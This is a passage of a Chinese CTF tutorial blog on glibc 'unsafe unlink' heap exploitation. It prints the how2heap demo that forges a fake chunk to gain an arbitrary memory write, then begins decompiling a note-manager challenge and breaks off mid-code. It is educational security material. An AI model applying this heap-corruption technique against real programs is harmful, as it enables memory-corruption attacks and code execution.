+<h2 id="how2heap的unlink分析"><a href="#how2heap的unlink分析" class="headerlink" title="how2heap的unlink分析"></a>how2heap的unlink分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">该程序在Ubuntu14<span class="number">.04</span>/<span class="number">16.04</span> <span class="number">64</span>位中测试</span><br><span class="line">当您在已知位置有指向可以调用unlink的区域的指针时，可以调用 unlink</span><br><span class="line">最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针</span><br><span class="line">这个练习的重点是使用<span class="built_in">free</span>来破坏全局chunk0_ptr来实现任意内存写。</span><br><span class="line">全局chunk0_ptr位于<span class="number">0x602078</span>，指向<span class="number">0x12a1010</span></span><br><span class="line">我们要破坏的chunk在<span class="number">0x12a10a0</span></span><br><span class="line">我们在chunk0中伪造一个假块。</span><br><span class="line">我们设置 fake chunk 的 <span class="string">&#x27;next_free_chunk&#x27;</span> (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;fd-&gt;bk = P.</span><br><span class="line">我们设置 fake chunk 的 <span class="string">&#x27;previous_free_chunk&#x27;</span> (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;bk-&gt;fd = P.</span><br><span class="line">通过上面的设置可以绕过检查: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><br><span class="line">fake chunk的fd: <span class="number">0x602060</span></span><br><span class="line">fake chunk的bk: <span class="number">0x602068</span></span><br><span class="line">我们假设chunk0中存在溢出漏洞，这样我们就可以更改chunk1的数据。</span><br><span class="line">通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 <span class="built_in">free</span> 的时候误以为前面的 <span class="built_in">free</span> chunk 是从我们伪造的 <span class="built_in">free</span> chunk开始的</span><br><span class="line">如果正常的 <span class="built_in">free</span> chunk0 的话 chunk1 的 prev_size 应该是 <span class="number">0x90</span> 但现在被改成了 <span class="number">0x80</span></span><br><span class="line">通过将chunk1的<span class="string">&#x27;previous_in_use&#x27;</span>设置为False，我们将伪造的堆块标记为空闲块。</span><br><span class="line">现在释放掉 chunk1，会触发 unlink，合并两个 <span class="built_in">free</span> chunk</span><br><span class="line">此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置</span><br><span class="line">Chunk0_ptr现在指向我们想要的位置，我们使用它来覆盖我们的victim <span class="built_in">string</span>。</span><br><span class="line">初始值:你好!～</span><br><span class="line">新值:BBBBAAAA</span><br></pre></td></tr></table></figure>
+
+<p>进入调试</p>
+<p>首先创建两个堆块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106173400643.png" alt="image-20220106173400643"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106173426013.png" alt="image-20220106173426013"></p>
+<p>然后再chunk0处伪造一个假块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106183601842.png" alt="image-20220106183601842"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106184351893.png" alt="image-20220106184351893"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106185229687.png" alt="image-20220106185229687"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106200336332.png" alt="image-20220106200336332"></p>
+<p>接下来释放掉 chunk1 因为 fake chunk 和 chunk1 是相邻的一个 free chunk，所以会将他两个合并，这就需要对 fake chunk 进行 unlink，此时chunk0_ptr=0x602060=chunk0_ptr[3]即p = &amp;p-0x18。chunk0_ptr指向的为chunk0的use_data,即指向fake chunk的pre_size.因此在这里p=chunk0_ptr;</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106185251614.png" alt="image-20220106185251614"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106185430766.png" alt="image-20220106185430766"></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>接下来看一到unlink的题</p>
+<p>参考的原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/100427158">https://blog.csdn.net/Breeze_CAT/article/details/100427158</a></p>
+<h3 id="首先对程序进行检查"><a href="#首先对程序进行检查" class="headerlink" title="首先对程序进行检查"></a>首先对程序进行检查</h3><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105182152889.png" alt="image-20220105182152889"></p>
+<h3 id="进入ida对函数进行分析"><a href="#进入ida对函数进行分析" class="headerlink" title="进入ida对函数进行分析"></a>进入ida对函数进行分析</h3><p>用n对函数名进行修改，方便之后的观察</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_4009FD(a1, a2, a3);</span><br><span class="line">  init__();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        Display();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先是存放note信息的结构体</p>
+<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct_list *<span class="title">init__</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  struct_list *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  list = <span class="built_in">malloc</span>(<span class="number">0x1810</span>uLL);</span><br><span class="line">  list-&gt;max_number = <span class="number">256LL</span>;</span><br><span class="line">  result = list;</span><br><span class="line">  list-&gt;now_number = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )                  <span class="comment">// //最多创建256个note结构体</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;list-&gt;struct_array.existence + <span class="number">3</span> * i) = <span class="number">0LL</span>;</span><br><span class="line">    *(&amp;list-&gt;struct_array.length + <span class="number">3</span> * i) = <span class="number">0LL</span>;</span><br><span class="line">    result = (&amp;list-&gt;struct_array.content + <span class="number">3</span> * i);</span><br><span class="line">    result-&gt;max_number = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从该结构体以及之后的函数可以推测出该结构体</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105204916321.png" alt="image-20220105204916321"></p>
+<h4 id="输出note信息："><a href="#输出note信息：" class="headerlink" title="输出note信息："></a>输出note信息：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Display</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 max_number; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">list</span>-&gt;now_number &lt;= <span class="number">0</span> )        <span class="comment">//没有note</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(max_number) = <span class="built_in">puts</span>(<span class="string">&quot;You need to create some new notes first.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )       <span class="comment">//逐个输出note信息</span></span><br><span class="line">    &#123;</span><br><span class="line">      max_number = <span class="built_in">list</span>-&gt;max_number;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= <span class="built_in">list</span>-&gt;max_number )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;<span class="built_in">list</span>-&gt;struct_array.existence + <span class="number">3</span> * i) == <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d. %s\n&quot;</span>, i, *(&amp;<span class="built_in">list</span>-&gt;struct_array.content + <span class="number">3</span> * i));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max_number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="新增note"><a href="#新增note" class="headerlink" title="新增note"></a>新增note</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 max_number; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">list</span>-&gt;now_number &lt; <span class="built_in">list</span>-&gt;max_number )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      max_number = <span class="built_in">list</span>-&gt;max_number;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= <span class="built_in">list</span>-&gt;max_number )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;<span class="built_in">list</span>-&gt;struct_array.existence + <span class="number">3</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Length of new note: &quot;</span>);</span><br><span class="line">        v3 = sub_40094E();</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v3 &gt; <span class="number">4096</span> )</span><br><span class="line">            v3 = <span class="number">4096</span>;</span><br><span class="line">          v4 = <span class="built_in">malloc</span>((<span class="number">128</span> - v3 % <span class="number">128</span>) % <span class="number">128</span> + v3);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">          sub_40085D(v4, v3);</span><br><span class="line">          *(&amp;<span class="built_in">list</span>-&gt;struct_array.existence + <span class="number">3</span> * i) = <span class="number">1LL</span>;</span><br><span class="line">          *(&amp;<span class="built_in">list</span>-&gt;struct_array.length + <span class="number">3</span> * i) = v3;</span><br><span class="line">          *(&amp;<span class="built_in">list</span>-&gt;struct_array.content + <span class="number">3</span> * i) = v4;</span><br><span class="line">          ++<span class="built_in">list</span>-&gt;now_number;</span><br><span class="line">          LODWORD(max_number) = <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(max_number) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_number;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(max_number) = <span class="built_in">puts</span>(<span class="string">&quot;Unable to create new note.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max_number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意 v4 = <span class="built_in">malloc</span>((<span class="number">128</span> - v3 % <span class="number">128</span>) % <span class="number">128</span> + v3);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意这里对note–&gt;content进行了对齐操作,其宽度为128字节</li>
+</ul>
+<h4 id="修改note"><a href="#修改note" class="headerlink" title="修改note"></a>修改note</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  struct_list *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note number: &quot;</span>);</span><br><span class="line">  v3 = sub_40094E();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt;= <span class="built_in">list</span>-&gt;max_number || *(&amp;<span class="built_in">list</span>-&gt;struct_array.existence + <span class="number">3</span> * v3) != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of note: &quot;</span>);</span><br><span class="line">  v2 = sub_40094E();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != *(&amp;<span class="built_in">list</span>-&gt;struct_array.length + <span class="number">3</span> * v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">list</span>;</span><br><span class="line">    *(&amp;v1-&gt;struct_array.content + <span class="number">3</span> * v3) = <span class="built_in">realloc</span>(</span><br><span class="line">                                              *(&amp;<span class="built_in">list</span>-&gt;struct_array.content + <span class="number">3</span> * v3),</span><br><span class="line">                                              (<span class="number">128</span> - v2 % <span class="number">128</span>) % <span class="number">128</span> + v2);</span><br><span class="line">    *(&amp;<span class="built_in">list</span>-&gt;struct_array.length + <span class="number">3</span> * v3) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">  sub_40085D(*(&amp;<span class="built_in">list</span>-&gt;struct_array.content + <span class="number">3</span> * v3), v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里检验了note_number是否在0-max–&gt;number之间,并检查了note-&gt;existence是否有效</p>
+<h4 id="删除note"><a href="#删除note" class="headerlink" title="删除note"></a>删除note</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">list</span>-&gt;now_number &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No notes yet.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note number: &quot;</span>);</span><br><span class="line">  v1 = sub_40094E();</span><br><span 